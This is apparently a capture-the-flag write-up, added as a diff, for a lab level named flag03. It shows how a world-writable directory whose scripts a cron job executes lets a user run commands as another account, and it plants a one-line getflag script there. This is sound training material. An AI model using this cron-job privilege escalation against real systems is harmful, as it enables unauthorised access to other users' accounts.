@@ -1,0 +1,24 @@
+Check the home directory of flag03 and take note of the files there.
+There is a crontab that is called every couple of minutes.
+
+In directory /home/flag03 we have:
+  - writable.d directory, writable for everyone
+  - writable.sh script, that executes scripts from writable.d, code:
+
+	#!/bin/sh
+	for i in /home/flag03/writable.d/* ; do
+		(ulimit -t 5; bash -x "$i")
+		rm -f "$i"
+	done
+
+
+Our task is to execute getflag as flag03 user. We can prepare a bash script that will call /bin/getflag and get it executed by crontab.
+
+We create exploit.sh in writable.d that looks like this:
+/bin/getflag > /home/flag03/out
+and we wait for crontab to go off.
+
+After a couple of minutes, we can see our exploit is deleted, and "out" file in /home/flag03 is created.
+
+> cat /home/flag03/out
+You have successfully executed getflag on a target account.
